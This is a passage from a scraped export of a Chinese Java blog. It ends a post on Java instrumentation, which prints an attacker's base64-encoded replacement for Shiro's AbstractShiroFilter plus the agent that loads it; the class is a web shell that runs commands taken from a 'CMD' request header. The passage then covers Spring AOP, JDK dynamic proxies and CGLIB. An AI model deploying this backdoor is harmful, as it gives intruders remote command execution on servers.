XZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFLAUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hbmFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdleGVjdXRlAQAzKExqYXZhL3V0aWwvY29uY3VycmVudC9DYWxsYWJsZTspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2F1c2UBABcoKUxqYXZhL2xhbmcvVGhyb3dhYmxlOwEABWRlYnVnAQAIZ2V0Q2hhaW4BAAV0cmFjZQEACGRvRmlsdGVyAQAXb3JnL3NsZjRqL0xvZ2dlckZhY3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0ai9Mb2dnZXI7BCEAYABiAAAABQAaAGUAZgAAABoAZwBoAAEAaQAAAAIACwACAGoAawAAAAIAbABtAAAAAgBuAG8AAAAXAAQAcABxAAEAcgAAACoAAgABAAAACiq3AAEqA7UAArEAAAABAHMAAAAOAAMAAABdAAQAXgAJAF8AAQB0AHUAAQByAAAAHQABAAEAAAAFKrQAA7AAAAABAHMAAAAGAAEAAABiAAEAdgB3A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\u0026#34;); ClassDefinition classDefinition = new ClassDefinition(clazz, arrayOfByte); try { paramInstrumentation.redefineClasses(new ClassDefinition[] { classDefinition }); } catch (Exception e) { e.printStackTrace(); } } } } catch (Exception e) {} } }   agent.jar/META-INF/MANIFEST.MF：\n1 2 3 4 5  Manifest-Version: 1.0 Can-Redefine-Classes: true Agent-Class: HotSwapAgent Premain-Class: HotSwapAgent Can-Retransform-Classes: true   作者用自定义类替换 “org.apache.shiro.web.servlet.AbstractShiroFilter”，企图绕过鉴权。\n写在后面 微服务架构下，进程间的联系错综复杂，客户端的请求到了服务器端后可能形成了复杂的调用链，假如发生了异常，如何查明哪里发生故障以及什么原因导致性能下降？分布式追踪（Distributed Tracing） 正是一种解决方案。Java 王国有着许许多多的 APM（Application Performance Monitoring）系统专门解决此类问题，例如 SkyWalking、Zipkin、Pinpoint，它们或多或少支持了名为 OpenTracing 的标准，分布式追踪的标准与技术非常有助于微服务架构下的故障排除。\n 本文首发于 https://h2cone.github.io\n 文章参考   Package java.lang.instrument\n  Instrumentation (computer programming)\n  Interface Instrumentation\n  Attach API\n  入门科普，围绕JVM的各种外挂技术\n  java-instrumentation\n  Guide to Java Instrumentation\n  Java Attach API\n  JAVA 拾遗 \u0026ndash;Instrument 机制\n  Instrumentation: querying the memory usage of a Java object\n  Java动态追踪技术探究\n  JVM 源码分析之 javaagent 原理完全解读\n  Java神器BTrace，从入门到熟练小工的手册\n  ","date":"2019-10-30T15:27:01+08:00","permalink":"https://h2cone.github.io/2019/10/30/instrument_attach/","title":"Java 程序探测或追踪"},{"content":"楔子 想象一下，我们编写的代码块重复了两次或两次以上，理智的程序员可能会考虑重构，提取公共的部分抽象成函数或方法，通过重用函数或方法以此减少冗余，简化代码，甚至预防了“牵一发而动全身”的噩梦，这已经算得上是对 DRY 和 SoC 原则的践行。DRY（Don\u0026rsquo;t repeat yourself）教导我们尽量减少重复代码，而 SoC（Separation of Concerns）指的是关注点分离，因为关注点混杂会极大地增强复杂性，好比把什么都混为一谈，堆积而成的祖传代码，这又是程序员们的另一个噩梦，所以才把复杂的问题分解成若干独立的小问题，模块化，极力追求“高内聚，低耦合”。\nAOP（Aspect-oriented programming）是对横向的重用，非常符合 DRY 和 SoC 的原则。直观上，代码总是从上往下执行，不妨称之为纵向，OOP（Object-oriented Programming）的继承也可看作是纵向；相对则是横向，从横跨多个类的角度来看，横向有着许许多多的统一逻辑可以切入，比如安全检查、异常处理、日志输出、事务管理、追踪、监控等等，这些统一逻辑能够被抽象成模块，重用它们甚至不需要显式使用或只需要编写简单的元数据进行声明，一次编写，到处执行，Java 程序员们已经体验过不少 Spring AOP 的魔术。\nAOP 能够使前文所述的统一逻辑模块化，这些统一逻辑可称之为横切关注点（crosscutting concerns），切面（Aspect）则作为模块，因此译为切面导向编程。切面的作用效果彷佛是往程序的执行点注入了新的代码，这些执行点被称之为接入点（Join Point），比如方法调用的前后；接入点的集合称之为切入点 （Pointcut），比如满足条件的一组方法；注入的代码称之为建议（Advice），比如在方法调用前后输出日志；其中代码注入的术语是编织（Weaving），既然把编织工作交给库或框架，那么可能是在编译时编织（Compile-time weaving）或运行时编织（Run-Time weaving），还可能在编译后编织（Post-compile weaving） 或加载时编织（Load-time weaving）。\n虽说如此，那属于 Spring 核心的 Spring AOP 的魔术是怎么做到的呢？\n喧闹中，听见了一句悄悄话：\n Spring AOP is implemented by using runtime proxies.\n 另一句悄悄话：\n In the Spring Framework, an AOP proxy is a JDK dynamic proxy or a CGLIB proxy.\n 原来 Spring AOP 是使用运行时代理实现的，代理则是由 JDK 动态代理或 CGLIB 生成。据传闻所说，利用 JDK 动态代理能够在运行时生成代理，一番打听之后也了解到 CGLIB 是一个字节码生成和转换库，也可用于动态生成代理。\n Byte Code Generation Library is high level API to generate and transform JAVA byte code. It is used by AOP, testing, data access frameworks to generate dynamic proxy objects and intercept field access.\n 门打开了，面前是通向秘密地下室的分岔，一条是名为 JDK 动态代理的路，另一条是名为 CGLIB 的路。\n探秘 Python、JavaScript、PHP、Ruby 等动态语言们，竟然能在运行时对类/属性/方法/函数进行操作，作为静态语言的 Java 在不重启 JVM 的前提下，是否也可以在运行时操作类？\n当我们写完一个 Java 程序，通过 Java 编译器编译后输出包含 Java 字节码的 Class 文件，随后启动 Java 虚拟机（简称 JVM，本文以 HotSpot 为例），Java 运行时环境（JRE）通过类加载器（ClassLoader）加载类到 JVM 运行时的方法区，方法区储存着类的数据，比如运行时的常量池（Run-Time Constant Pool）和方法代码等，之后，类被实例化或对象被创建\u0026hellip;\u0026hellip;那么，Java 是否支持运行时修改类或者运行时生成类并动态加载到方法区？\n一番搜索后，果然其中一些想法早已实现在 JDK 中。JDK 动态代理不仅能够在运行时生成类，还能拦截方法调用，接下来用简单的代码详细说明。\n我们有一个简单的接口和接口实现类：\n1 2 3 4 5  public interface PersonService { String sayHello(String name); }   1 2 3 4 5 6 7  public class SimplePersonService implements PersonService { @Override public String sayHello(String name) { return \u0026#34;Hello, \u0026#34; + name; } }   感谢多态，我们可以使用接口 say hello：\n1 2 3 4 5 6  @Test public void helloWorld() { PersonService service = new SimplePersonService(); String result = service.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); }   可是，如果我们需要在 sayHello(\u0026ldquo;World\u0026rdquo;) 调用前后添加一些逻辑，比如：\n1 2 3  System.out.println(\u0026#34;之前做点什么\u0026#34;); String result = service.sayHello(\u0026#34;World\u0026#34;); System.out.println(\u0026#34;之后做点什么\u0026#34;);   插入一两处也许还能接受，如果 sayHello(\u0026hellip;) 遍布各处或不便改动其上下文代码，为了减少代码冗余和分离关注点，试试 JDK 动态代理吧。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  @Test public void sayHello() { // 创建目标实例（被代理实例，可选）。  SimplePersonService target = new SimplePersonService(); // 生成代理类，创建代理实例。  PersonService proxy = (PersonService) Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), new PersonServiceHandler(target)); String result = proxy.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); } /** * 拦截 PersonService 方法调用的处理器 */ static class PersonServiceHandler implements InvocationHandler { /** * 目标实例 (被代理实例) */ Object target; PersonServiceHandler() { } PersonServiceHandler(Object target) { this.target = target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.printf(\u0026#34;proxy class: %s\\n\u0026#34;, proxy.getClass()); System.out.printf(\u0026#34;method: %s\\n\u0026#34;, method); System.out.printf(\u0026#34;args: %s\\n\u0026#34;, Arrays.toString(args)); if (target != null) { System.out.println(\u0026#34;Before invoke\u0026#34;); // 调用前，添加逻辑。  Object result = method.invoke(target, args); System.out.println(result); System.out.println(\u0026#34;After invoke\u0026#34;); // 调用后，添加逻辑。  return result; } return null; } }   上面这段代码通过了测试并输出了以下内容：\n1 2 3 4 5 6  proxy class: class com.sun.proxy.$Proxy4 method: public abstract java.lang.String io.h2cone.proxy.jdk.PersonService.sayHello(java.lang.String) args: [World] Before invoke Hello, World After invoke   生成的代理类名叫 com.sun.proxy.$Proxy4，官方文档对代理类的定义是：\n A dynamic proxy class is a class that implements a list of interfaces specified at runtime such that a method invocation through one of the interfaces on an instance of the class will be encoded and dispatched to another object through a uniform interface\n 同时注意到了 java.lang.reflect.Proxy#newProxyInstance 方法参数：\n1 2 3  loader – the class loader to define the proxy class interfaces – the list of interfaces for the proxy class to implement h – the invocation handler to dispatch method invocations to   第二个参数是代理类实现的接口列表，原来代理类是接口实现类，回顾一下上文的代码，com.sun.proxy.$Proxy4 实现了 PersonService 接口，而 SimplePersonService 也实现了 PersonService 接口，也就说代理类和被代理类是兄弟姐妹。所谓代理，在这里就是通过重写 InvocationHandler 的 invoke 方法拦截 PersonService 方法调用并能在调用前后添加逻辑。\n当用 Java 工作的时候，程序员们也许经常编写许多接口，但每个接口却只有一个实现类，不免有一种“过度工程”的嫌疑，往往很多接口成为了不必要的抽象，还因此多了一些运行时开销，接口虽好却不必过早设计。回到动态代理的话题，是否有可能不需要接口就能动态生成代理类？\n到了 CGLIB 的用武之地。CGLIB 其实是（Code Generation Library）的简称，译作代码生成库，但这会让人困惑，难道是生成 Java 源代码？并不是，它的真名是 Java 字节码生成库。Java 字节码（Java bytecode）看起来如何？\n对于上文的代码，当我们用 javac 编译源代码成功会输出 PersonService.class 和 SimplePersonService.class 等文件。我们用编辑器看看其中一个文件的内容：\n1 2 3 4 5 6 7 8 9 10 11 12  cafe babe 0000 0034 0009 0700 0707 0008 0100 0873 6179 4865 6c6c 6f01 0026 284c 6a61 7661 2f6c 616e 672f 5374 7269 6e67 3b29 4c6a 6176 612f 6c61 6e67 2f53 7472 696e 673b 0100 0a53 6f75 7263 6546 696c 6501 0012 5065 7273 6f6e 5365 7276 6963 652e 6a61 7661 0100 2169 6f2f 6832 636f 6e65 2f70 726f 7879 2f6a 646b 2f50 6572 736f 6e53 6572 7669 6365 0100 106a 6176 612f 6c61 6e67 2f4f 626a 6563 7406 0100 0100 0200 0000 0000 0104 0100 0300 0400 0000 0100 0500 0000 0200 06   这就是 Java 字节码看起来的样子，这里表现为十六进制数据。Java 编译时从源代码到字节码，字节码也可动态编译（JIT）为机器码（native code）；机器只理解机器码，而 JVM 只理解 Java 字节码，可以说 Java 字节码是 JVM 的指令集。既然 Class 文件包含了 Java 字节码，则修改类或生成类是由操作 Java 字节码开始，可是我们大部分都只擅长 Java 代码，操作 Java 字节码要怎么开始呢？\n不妨先试试从 Class 文件逆向到 Java 文件，利用反汇编命令行工具，例如在终端中敲下 javap -v SimplePersonService.class，你将得到 Class 文件格式（The class File Format）的直观认识；但是，操作 Java 字节码需要透彻理解 Java 虚拟机规范，比如 JVM 的指令集和 JVM 内幕，ASM 的出现使之成为可能。ASM 是一个 Java 字节码操作和分析框架，可用于修改已存在类或者动态生成类，程序员们不满足于此，利用 ASM 封装了更高层的 Java API，最终出现了 CGLIB。\n我们来看看 CGLIB 仓库的维基的一段描述：\n cglib is a powerful, high performance and quality Code Generation Library, It is used to extend JAVA classes and implements interfaces at runtime\n 无需接口动态生成代理类不是不可能的，因为代理类可以继承被代理类。接下来体验一下 CGLIB，我们使用抽象类代替接口：\n1 2 3 4 5 6  public abstract class PersonService { public String sayHello(String name) { return \u0026#34;Hello, \u0026#34; + name; } }   然后，用 CGLIB 的方式 say hello：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  @Test public void sayHello() { Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(PersonService.class); // 设置基类。  enhancer.setCallback(new PersonServiceInterceptor()); // 设置方法调用拦截器。  PersonService service = (PersonService) enhancer.create(); // 生成代理类，创建代理实例。  String result = service.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); } /** * PersonService 方法调用拦截器 */ static class PersonServiceInterceptor implements MethodInterceptor { @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { System.out.printf(\u0026#34;obj class: %s\\n\u0026#34;, obj.getClass()); System.out.printf(\u0026#34;method: %s\\n\u0026#34;, method); System.out.printf(\u0026#34;args: %s\\n\u0026#34;, Arrays.toString(args)); System.out.printf(\u0026#34;method proxy: %s\\n\u0026#34;, proxy); System.out.println(\u0026#34;Before invoke\u0026#34;); // 调用前，添加逻辑。  Object result = proxy.invokeSuper(obj, args); System.out.println(result); System.out.println(\u0026#34;After invoke\u0026#34;); // 调用后，添加逻辑。  return result; } }   输出结果如下：\n1 2 3 4 5 6 7  obj class: class io.h2cone.proxy.cglib.PersonService$$EnhancerByCGLIB$$64e53be2 method: public java.lang.String io.h2cone.proxy.cglib.PersonService.sayHello(java.lang.String) args: [World] method proxy: net.sf.cglib.proxy.MethodProxy@629f0666 Before invoke Hello, World After invoke   这种方式的代理类名称是 obj calss 对应的值，顾名思义，它是 PersonService 的增强类。在生成代理类之前，enhancer 设置了基类 PersonService，由此生成的代理类自然就继承了被代理类（PersonService），它们是孩子与父母的关系。CGLIB 与 JDK 